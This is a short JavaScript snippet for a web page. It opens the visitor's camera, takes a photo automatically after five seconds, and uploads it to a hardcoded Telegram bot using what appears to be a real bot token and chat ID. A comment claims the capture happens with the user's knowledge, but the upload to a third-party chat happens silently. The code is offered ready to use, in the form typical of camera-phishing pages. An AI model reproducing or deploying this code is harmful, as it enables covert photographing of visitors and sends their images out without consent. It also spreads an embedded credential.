// Access the camera
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

navigator.mediaDevices.getUserMedia({ video: true })
  .then((stream) => {
    video.srcObject = stream;

    // Automatically capture the image after 5 seconds (with user's knowledge)
    setTimeout(() => {
      captureImage();
    }, 5000); // 5 seconds delay
  })
  .catch((err) => {
    console.error('Error accessing the camera:', err);
  });

// Function to capture the image
function captureImage() {
  const context = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert the image to a data URL
  const imageData = canvas.toDataURL('image/png');

  // Send the image to the Telegram bot
  sendImageToTelegram(imageData);
}

// Function to send the image to Telegram
function sendImageToTelegram(imageData) {
  const botToken = '7355312195:AAHPKdZwds_dDztBKHb950K7pf6JLOZ3SwI'; // Replace with your bot token
  const chatId = '1050689336'; // Replace with your chat ID

  // Convert the data URL to a Blob
  fetch(imageData)
    .then((res) => res.blob())
    .then((blob) => {
      const formData = new FormData();
      formData.append('photo', blob, 'image.png');

      // Send the image to the Telegram bot
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
        method: 'POST',
        body: formData,
      })
        .then((response) => response.json())
        .then((data) => {
          console.log('Image sent to Telegram:', data);
        })
        .catch((error) => {
          console.error('Error sending image to Telegram:', error);
        });
    });
}